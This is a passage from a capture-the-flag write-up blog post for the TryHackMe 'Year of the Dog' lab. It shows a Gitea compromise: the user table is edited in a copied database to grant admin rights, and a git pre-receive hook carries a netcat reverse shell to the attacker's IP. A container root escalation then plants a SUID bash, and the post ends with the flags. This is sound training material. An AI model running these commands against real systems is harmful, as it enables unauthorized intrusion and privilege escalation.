+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>10</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>17</span> <span class=n>usr</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>13</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>34</span> <span class=k>var</span>
+</span></span><span class=line><span class=cl><span class=n>lrwxrwxrwx</span>   <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>        <span class=mi>31</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>33</span> <span class=n>vmlinuz</span> <span class=o>-&gt;</span> <span class=n>boot</span><span class=o>/</span><span class=n>vmlinuz</span><span class=o>-</span><span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>115</span><span class=o>-</span><span class=n>generic</span>
+</span></span><span class=line><span class=cl><span class=n>lrwxrwxrwx</span>   <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>        <span class=mi>30</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>17</span> <span class=n>vmlinuz</span><span class=o>.</span><span class=n>old</span> <span class=o>-&gt;</span> <span class=n>boot</span><span class=o>/</span><span class=n>vmlinuz</span><span class=o>-</span><span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=n>generic</span>
+</span></span><span class=line><span class=cl><span class=n>dylan</span><span class=err>@</span><span class=n>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>dog</span><span class=p>:</span><span class=o>~$</span> <span class=n>cd</span> <span class=o>/</span><span class=n>gitea</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>dylan</span><span class=err>@</span><span class=n>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>dog</span><span class=p>:</span><span class=o>/</span><span class=n>gitea</span><span class=o>$</span>
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.179.85:8080/>http://10.10.179.85:8080/</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Dog$ scp dylan@10.10.179.85:/gitea/gitea/gitea.db /home/kali/CTFs/tryhackme/Year\ of\ the\ Dog/gitea.db
+</span></span><span class=line><span class=cl>dylan@10.10.179.85&#39;s password:
+</span></span><span class=line><span class=cl>gitea.db                                                                         100% 1184KB 393.6KB/s   00:03
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Dog$ sqlite3 gitea.db
+</span></span><span class=line><span class=cl>SQLite version 3.31.1 2020-01-27 19:55:54
+</span></span><span class=line><span class=cl>Enter &#34;.help&#34; for usage hints.
+</span></span><span class=line><span class=cl>sqlite&gt; SELECT * FROM user;
+</span></span><span class=line><span class=cl>1|dylan|Dylan|Dylan Anderson|dylan@yearofthedog.thm|0|enabled|f2fd45caa2f5eae17cb5faa06eb57c4ad05532550fe37ae99e2245429757af09350be12abba616de4e8f0e37d223bd327261|argon2|0|0|0||0|||Rs6zSrVgx0|vkA9FTpZ72|en-US||1599331364|1599511857|1599511857|0|-1|1|1|0|0|0|1|0|8bb88c80301457422026e95699061e4a|dylan@yearofthedog.thm|1|0|0|0|1|0|0|0|0||gitea|0
+</span></span><span class=line><span class=cl>2|test|test||test@example.de|0|enabled|e6d955e14c8e7d1736ea12090cc7fd8bfb9ed04ed907d06626969038c60dc8a341925af3bcfa870805bc07010e8a18f47a3f|argon2|0|0|0||0|||evuSMwlzZI|5lIckyKZjs|en-US||1605380293|1605380293|1605380293|0|-1|1|0|0|0|0|1|0|27091d6d9177f6041782b04c2223746f|test@example.de|0|0|0|0|0|0|0|0|0||gitea|0
+</span></span><span class=line><span class=cl>sqlite&gt; select lower_name, is_admin from user;
+</span></span><span class=line><span class=cl>dylan|1
+</span></span><span class=line><span class=cl>test|0
+</span></span><span class=line><span class=cl>sqlite&gt; UPDATE user SET is_admin=1 WHERE lower_name=&#34;test&#34;;
+</span></span><span class=line><span class=cl>sqlite&gt; .quit
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Dog$
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.179.85:8080/admin>http://10.10.179.85:8080/admin</a></p><p><a href=http://10.10.179.85:8080/test/Test-Repo/settings/hooks/git/pre-receive>http://10.10.179.85:8080/test/Test-Repo/settings/hooks/git/pre-receive</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/sh
+</span></span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># An example hook script to make use of push options.</span>
+</span></span><span class=line><span class=cl><span class=c1># The example simply echoes all push options that start with &#39;echoback=&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># and rejects all pushes when the &#34;reject&#34; push option is used.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># To enable this hook, rename this file to &#34;pre-receive&#34;.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>test</span> -n <span class=s2>&#34;</span><span class=nv>$GIT_PUSH_OPTION_COUNT</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>then</span>
+</span></span><span class=line><span class=cl>	<span class=nv>i</span><span class=o>=</span><span class=m>0</span>
+</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=nb>test</span> <span class=s2>&#34;</span><span class=nv>$i</span><span class=s2>&#34;</span> -lt <span class=s2>&#34;</span><span class=nv>$GIT_PUSH_OPTION_COUNT</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=k>do</span>
+</span></span><span class=line><span class=cl>		<span class=nb>eval</span> <span class=s2>&#34;value=\$GIT_PUSH_OPTION_</span><span class=nv>$i</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=s2>&#34;</span><span class=nv>$value</span><span class=s2>&#34;</span> in
+</span></span><span class=line><span class=cl>		<span class=nv>echoback</span><span class=o>=</span>*<span class=o>)</span>
+</span></span><span class=line><span class=cl>			<span class=nb>echo</span> <span class=s2>&#34;echo from the pre-receive-hook: </span><span class=si>${</span><span class=nv>value</span><span class=p>#*=</span><span class=si>}</span><span class=s2>&#34;</span> &gt;<span class=p>&amp;</span><span class=m>2</span>
+</span></span><span class=line><span class=cl>			<span class=p>;;</span>
+</span></span><span class=line><span class=cl>		reject<span class=o>)</span>
+</span></span><span class=line><span class=cl>			<span class=nb>exit</span> <span class=m>1</span>
+</span></span><span class=line><span class=cl>		<span class=k>esac</span>
+</span></span><span class=line><span class=cl>		<span class=nv>i</span><span class=o>=</span><span class=k>$((</span>i <span class=o>+</span> <span class=m>1</span><span class=k>))</span>
+</span></span><span class=line><span class=cl>	<span class=k>done</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>mkfifo /tmp/f<span class=p>;</span> nc 10.8.106.222 <span class=m>9001</span> &lt; /tmp/f <span class=p>|</span> /bin/sh &gt;/tmp/f 2&gt;<span class=p>&amp;</span>1<span class=p>;</span> rm /tmp/f
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dylan@year-of-the-dog:~$ git clone http://localhost:3000/test/Test-Repo &amp;&amp; cd Test-Repo
+</span></span><span class=line><span class=cl>Cloning into &#39;Test-Repo&#39;...
+</span></span><span class=line><span class=cl>warning: You appear to have cloned an empty repository.
+</span></span><span class=line><span class=cl>dylan@year-of-the-dog:~/Test-Repo$ echo &#34;test&#34; &gt;&gt; README.md
+</span></span><span class=line><span class=cl>dylan@year-of-the-dog:~/Test-Repo$ git add README.md
+</span></span><span class=line><span class=cl>dylan@year-of-the-dog:~/Test-Repo$ git commit -m &#34;Exploit&#34;
+</span></span><span class=line><span class=cl>[master (root-commit) 95a2fec] Exploit
+</span></span><span class=line><span class=cl> 1 file changed, 1 insertion(+)
+</span></span><span class=line><span class=cl> create mode 100644 README.md
+</span></span><span class=line><span class=cl>dylan@year-of-the-dog:~/Test-Repo$ git push
+</span></span><span class=line><span class=cl>Username for &#39;http://localhost:3000&#39;: test
+</span></span><span class=line><span class=cl>Password for &#39;http://test@localhost:3000&#39;:
+</span></span><span class=line><span class=cl>Counting objects: 3, done.
+</span></span><span class=line><span class=cl>Writing objects: 100% (3/3), 217 bytes | 217.00 KiB/s, done.
+</span></span><span class=line><span class=cl>Total 3 (delta 0), reused 0 (delta 0)
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dylan@year-of-the-dog:/gitea/gitea$ cd /bin
+</span></span><span class=line><span class=cl>dylan@year-of-the-dog:/bin$ python3 -m http.server
+</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</span></span><span class=line><span class=cl>172.17.0.2 - - [14/Nov/2020 19:14:14] &#34;GET /bash HTTP/1.1&#34; 200 -
+</span></span><span class=line><span class=cl>^C
+</span></span><span class=line><span class=cl>Keyboard interrupt received, exiting.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Dog$ nc -nlvp 9001
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 9001
+</span></span><span class=line><span class=cl>Connection received on 10.10.179.85 36967
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>git
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl>uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>User git may run the following commands on 42040a8f97fc:
+</span></span><span class=line><span class=cl>    (ALL) NOPASSWD: ALL
+</span></span><span class=line><span class=cl>sudo -s
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+</span></span><span class=line><span class=cl>wget 172.17.0.1:8000/bash -O /data/bash
+</span></span><span class=line><span class=cl>Connecting to 172.17.0.1:8000 (172.17.0.1:8000)
+</span></span><span class=line><span class=cl>saving to &#39;/data/bash&#39;
+</span></span><span class=line><span class=cl>bash                 100% |********************************| 1087k  0:00:00 ETA
+</span></span><span class=line><span class=cl>&#39;/data/bash&#39; saved
+</span></span><span class=line><span class=cl>chmod 4755 /data/bash
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dylan@year-of-the-dog:/gitea$ ls -la
+</span></span><span class=line><span class=cl>total 1108
+</span></span><span class=line><span class=cl>drwxr-xr-x  5 root  root     4096 Nov 14 19:14 .
+</span></span><span class=line><span class=cl>drwxr-xr-x 23 root  root     4096 Sep  5 19:29 ..
+</span></span><span class=line><span class=cl>-rwsr-xr-x  1 root  root  1113504 Nov 14 19:14 bash
+</span></span><span class=line><span class=cl>drwxr-xr-x  5 dylan dylan    4096 Sep  5 19:41 git
+</span></span><span class=line><span class=cl>drwxr-xr-x  9 dylan dylan    4096 Nov 14 19:05 gitea
+</span></span><span class=line><span class=cl>drwx------  2 root  root     4096 Sep  5 19:29 ssh
+</span></span><span class=line><span class=cl>dylan@year-of-the-dog:/gitea$ ./bash -p
+</span></span><span class=line><span class=cl>bash-4.4# id
+</span></span><span class=line><span class=cl>uid=1000(dylan) gid=1000(dylan) euid=0(root) groups=1000(dylan)
+</span></span><span class=line><span class=cl>bash-4.4# cat /root/root.txt
+</span></span><span class=line><span class=cl>THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}
+</span></span></code></pre></td></tr></table></div></div><p>User Flag</p><p><code>THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}</code></p><p>Root Flag</p><p><code>THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
